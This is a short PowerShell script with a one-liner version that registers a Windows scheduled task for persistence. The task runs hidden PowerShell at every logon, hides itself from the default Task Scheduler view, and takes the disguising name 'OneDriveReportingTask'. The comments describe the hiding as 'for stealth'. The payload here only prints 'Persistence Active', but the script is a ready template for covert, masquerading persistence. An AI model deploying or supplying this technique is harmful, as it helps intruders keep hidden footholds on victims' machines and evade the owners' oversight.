# 1. Define the Action
# Uses -NoProfile to stay lean and -WindowStyle Hidden for stealth.
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -Command 'Write-Output \"Persistence Active\"'"

# 2. Define the Trigger
# Triggers only when your specific user logs in.
$Trigger = New-ScheduledTaskTrigger -AtLogOn

# 3. Define the Settings
# -Hidden hides it from the default Task Scheduler view.
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

# 4. Register the Task
# We use a user-level name and explicitly target your user account to avoid "Access Denied."
Register-ScheduledTask -TaskName "OneDriveReportingTask" -Action $Action -Trigger $Trigger -Settings $Settings -User $env:USERNAME -Force


#One liner:

$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ' -NoProfile -Command "Write-Output \"Persistence Active\""'; $Trigger = New-ScheduledTaskTrigger -AtLogOn; $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName 'OneDriveReportingTask' -Action $Action -Trigger $Trigger -Settings $Settings -User $env:USERNAME -Force
